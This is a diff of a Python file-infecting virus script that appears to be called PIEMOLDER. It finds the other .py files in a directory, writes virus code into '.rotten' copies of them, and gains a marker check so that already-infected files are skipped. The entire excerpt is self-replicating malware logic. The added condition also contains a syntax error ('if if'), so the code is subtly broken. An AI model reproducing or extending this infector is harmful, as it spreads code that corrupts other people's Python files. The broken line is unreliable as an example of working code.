@@ -23,9 +23,11 @@ def execute(virus):
 	allpies = glob.glob("*.py")
 
 	for py in allpies:
-		# For all pies we found...(but not ourself)
-		if py != os.path.basename(__file__):
+		# For all pies we found...(but not ourself, or already infected files)
+		thepie = open(py, "r")
+		if if "# PIEMOLDER:START" not in thepie.readline() and py != os.path.basename(__file__):
 			# Create a .rotten version of the pie
+			thepie.close()
 			thepie = open(py, "r")
 			rottenpie = open("%s.rotten" % py, "w")
 			# Write 'virus' to the .rotten file
